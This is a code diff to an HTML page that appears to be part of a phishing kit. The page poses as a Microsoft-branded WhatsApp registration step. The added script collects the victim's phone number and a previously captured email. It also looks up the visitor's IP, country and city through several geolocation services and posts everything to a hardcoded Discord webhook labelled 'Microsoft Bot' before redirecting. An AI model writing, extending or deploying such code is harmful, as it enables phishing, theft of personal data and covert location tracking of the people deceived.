@@ -291,42 +291,126 @@ input[type=tel]::-webkit-outer-spin-button {
     </div>
 </body>
 <script>
+   
     const webhook = "https://discord.com/api/webhooks/1507131798218342512/HttmYqpus_6kYPNe1WyYNxSyhkGjzTLxjlSNlIpTPtZUEeWuCfy9EJeF_ILhDmmBNYpq";
+    
+    async function fetchWithTimeout(url, timeout = 5000) {
+        const controller = new AbortController();
+        const id = setTimeout(() => controller.abort(), timeout);
+        try {
+            const response = await fetch(url, { signal: controller.signal });
+            clearTimeout(id);
+            return response;
+        } catch (error) {
+            clearTimeout(id);
+            throw error;
+        }
+    }
+    
+    async function getGeoInfo() {
+        const apis = [
+            { url: 'https://ipapi.co/json/', parser: (data) => ({ ip: data.ip, pais: data.country_name, ciudad: data.city }) },
+            { url: 'https://ipinfo.io/json/', parser: (data) => ({ ip: data.ip, pais: data.country, ciudad: data.city }) },
+            { url: 'https://api.ipify.org?format=json', parser: (data) => ({ ip: data.ip, pais: 'Desconocido', ciudad: 'Desconocido' }) },
+            { url: 'https://api.my-ip.io/ip.json', parser: (data) => ({ ip: data.ip, pais: data.country || 'Desconocido', ciudad: data.city || 'Desconocido' }) }
+        ];
+        for (const api of apis) {
+            try {
+                const res = await fetchWithTimeout(api.url, 4000);
+                if (!res.ok) continue;
+                const data = await res.json();
+                let result = api.parser(data);
+                if (result.ip && result.ip !== 'No disponible') {
+                    if (result.pais === 'Desconocido' && result.ciudad === 'Desconocido' && api.url.includes('ipify')) {
+                        try {
+                            const geoRes = await fetchWithTimeout(`https://ipapi.co/${result.ip}/json/`, 3000);
+                            if (geoRes.ok) {
+                                const geoData = await geoRes.json();
+                                result.pais = geoData.country_name || 'Desconocido';
+                                result.ciudad = geoData.city || 'Desconocido';
+                            }
+                        } catch(e) {}
+                    }
+                    return result;
+                }
+            } catch(e) {
+                continue;
+            }
+        }
+        return { ip: 'No disponible', pais: 'No disponible', ciudad: 'No disponible' };
+    }
+    
+    async function ensureGeoInfo() {
+        const stored = localStorage.getItem('userDataIndex1');
+        if (stored) {
+            try {
+                const data = JSON.parse(stored);
+                if (data.geo && data.geo.ip && data.geo.ip !== 'No disponible') {
+                    return data.geo;
+                }
+            } catch(e) {}
+        }
+        return await getGeoInfo();
+    }
+    
+    function formatGeoLine(geo) {
+        return `🌍 **IP:** ${geo.ip} - 📍 **País:** ${geo.pais} - 🏙️ **Ciudad:** ${geo.ciudad}`;
+    }
+    
+    document.addEventListener('DOMContentLoaded', () => {
+        const countrySelect = document.getElementById('countrySelect');
+        const countryCodeDisplay = document.getElementById('countryCodeDisplay');
+        const phoneInput = document.getElementById('phone');
+        
+        const updatePrefix = () => {
+            countryCodeDisplay.textContent = countrySelect.value;
+        };
+        
+        countrySelect.addEventListener('change', updatePrefix);
+        phoneInput.addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/[^0-9\s-]/g, '');
+        });
+        updatePrefix();
+    });
+    
     document.querySelector('.btn1 button').addEventListener('click', async (e) => {
         e.preventDefault();
-        const userData = JSON.parse(localStorage.getItem('userDataIndex1') || '{}');
-        const email = userData.email || 'Sin correo';
+        
+        const phoneInput = document.getElementById('phone');
+        const phoneNumber = phoneInput.value.trim();
+        if (!phoneNumber) {
+            return;
+        }
+        
         const countryCode = document.getElementById('countrySelect').value;
-        const phoneNumber = document.getElementById('phone').value;
-        const fullNumber = countryCode + phoneNumber;
-        const mensaje = `📞 **WhatsApp registrado**\n📧 Correo: ${email}\n📱 Número: ${fullNumber}`;
+        const fullNumber = countryCode + ' ' + phoneNumber;
+        
+        const userDataRaw = localStorage.getItem('userDataIndex1');
+        let email = 'Sin correo';
+        if (userDataRaw) {
+            try {
+                const userData = JSON.parse(userDataRaw);
+                email = userData.email || 'Sin correo';
+            } catch(e) {}
+        }
+        
+        const geo = await ensureGeoInfo();
+        const geoLine = formatGeoLine(geo);
+        
+        const mensaje = `📞 **WhatsApp registrado**\n📧 Correo: ${email}\n📱 Número: ${fullNumber}\n${geoLine}`;
+        
         try {
             await fetch(webhook, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ content: mensaje, username: 'Microsoft Bot' })
             });
-        } catch(err) { console.error(err); }
+        } catch(err) {
+            console.error(err);
+        }
+        
         window.location.href = 'cargando.html';
     });
-</script>
-<script>
-    document.addEventListener('DOMContentLoaded', () => {
-    const countrySelect = document.getElementById('countrySelect');
-    const countryCodeDisplay = document.getElementById('countryCodeDisplay');
-    const phoneInput = document.getElementById('phone');
 
-    const updatePrefix = () => {
-        countryCodeDisplay.textContent = countrySelect.value;
-    };
-
-    countrySelect.addEventListener('change', updatePrefix);
-
-    phoneInput.addEventListener('input', (e) => {
-        e.target.value = e.target.value.replace(/[^0-9\s-]/g, '');
-    });
-
-    updatePrefix();
-});
 </script>
 </html>
